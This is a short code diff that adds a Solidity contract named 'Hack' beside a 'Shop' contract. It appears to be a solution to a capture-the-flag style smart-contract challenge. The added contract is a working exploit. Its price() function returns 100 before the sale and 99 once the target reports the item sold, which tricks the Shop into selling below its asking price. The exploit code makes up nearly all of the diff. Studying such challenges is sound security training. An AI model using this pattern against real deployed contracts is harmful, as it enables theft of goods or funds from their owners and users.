@@ -17,5 +17,25 @@ contract Shop {
       price = _buyer.price();
     }
   }
-  
+
+}
+
+contract  Hack {
+  Shop private immutable target;
+
+  constructor (address _target) {
+    target = Shop(_target);
+
+  }
+  function pwn() external {
+    target.buy();
+    require(target.price() == 99,"price != 99");
+  }
+
+  function price() external view returns (uint) {
+    if(target.isSold()) {
+      return 99;
+    }
+    return 100;
+  }
 }
